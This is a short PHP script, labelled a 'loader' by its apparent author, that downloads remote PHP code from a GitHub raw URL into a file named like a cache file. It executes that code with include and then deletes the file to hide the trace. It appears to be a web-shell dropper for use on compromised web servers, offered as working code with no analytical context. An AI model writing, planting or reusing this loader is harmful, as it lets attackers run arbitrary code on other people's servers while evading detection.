<?php
/* loader by 0x6ick - https://0x6ick.my.id */

$tmp = 'cache_ym.php';

$url = 'https://raw.githubusercontent.com/budiepep7-gif/dds/refs/heads/main/t.php';

if (!file_exists($tmp) || filesize($tmp) < 10) {

    $code = file_get_contents($url);

    file_put_contents($tmp, $code);
}

include($tmp);
unlink($tmp);
?>

